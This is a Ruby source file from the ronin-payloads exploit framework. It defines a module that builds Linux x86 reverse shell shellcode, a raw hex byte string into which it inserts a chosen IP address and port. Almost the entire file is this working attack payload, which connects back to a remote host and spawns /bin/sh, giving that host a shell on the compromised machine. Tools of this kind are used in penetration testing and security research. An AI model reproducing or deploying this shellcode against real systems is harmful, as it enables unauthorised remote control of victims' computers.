# encoding: ASCII-8BIT
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/reverse_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module X86
          #
          # Linux x86-64 shellcode that spawns a connect back reverse shell.
          #
          class ReverseShell < ReverseShellPayload

            register 'shellcode/linux/x86/reverse_shell'

            arch :x86
            os :linux

            author 'Russell Willis', email: 'codinguy@gmail.com'

            summary 'Linux x86 reverse shell shellcode'
            description <<~DESC
              Linux x86 shellcode that spawns a connect back reverse shell.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-849.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2" \
                         "\xb0\x66\xb3\x01\x51\x6a\x06\x6a" \
                         "\x01\x6a\x02\x89\xe1\xcd\x80\x89" \
                         "\xc6\xb0\x66\x31\xdb\xb3\x02\x68" \
                         "#{packed_ipv4}\x66\x68#{packed_port}\x66\x53\xfe" \
                         "\xc3\x89\xe1\x6a\x10\x51\x56\x89" \
                         "\xe1\xcd\x80\x31\xc9\xb1\x03\xfe" \
                         "\xc9\xb0\x3f\xcd\x80\x75\xf8\x31" \
                         "\xc0\x52\x68\x6e\x2f\x73\x68\x68" \
                         "\x2f\x2f\x62\x69\x89\xe3\x52\x53" \
                         "\x89\xe1\x52\x89\xe2\xb0\x0b\xcd" \
                         "\x80"
            end

          end
        end
      end
    end
  end
end
